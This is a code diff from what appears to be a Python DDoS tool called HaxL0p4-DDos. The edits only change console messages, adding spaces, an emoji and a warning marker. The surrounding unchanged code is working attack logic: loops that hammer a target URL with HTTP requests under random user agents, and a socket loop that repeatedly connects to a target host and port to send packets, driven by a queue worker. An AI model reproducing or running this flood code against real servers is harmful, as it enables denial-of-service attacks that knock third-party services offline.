@@ -152,7 +152,7 @@ def HaxL0p4_Ddos():
         try:
             while True:
                 req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-                print("\033[94mHaxL0p4-DDos is Attacking...\033[0m")
+                print("\033[94m HaxL0p4-DDos is Attacking...\033[0m")
                 time.sleep(.1)
         except:
             time.sleep(.1)
@@ -165,16 +165,16 @@ def HaxL0p4_Ddos():
                 s.connect((host,int(port)))
                 if s.sendto( packet, (host, int(port)) ):
                     s.shutdown(1)
-                    print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--HaxL0p4 packet sent!--> \033[0m")
+                    print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--HaxL0p4 packet sent 💻--> \033[0m")
                 else:
                     s.shutdown(1)
-                    print("\033[91mshut<->down\033[0m")
+                    print("\033[91m shut<->down\033[0m")
                 time.sleep(.1)
         except socket.error as e:
-            print("\033[91mno connection! server maybe down\033[0m")
+            print("\033[91m [❗] no connection! server maybe down\033[0m")
             time.sleep(.1)
 
-    def dos():
+    def dos(): 
         while True:
             item = q.get()
             down_it(item)
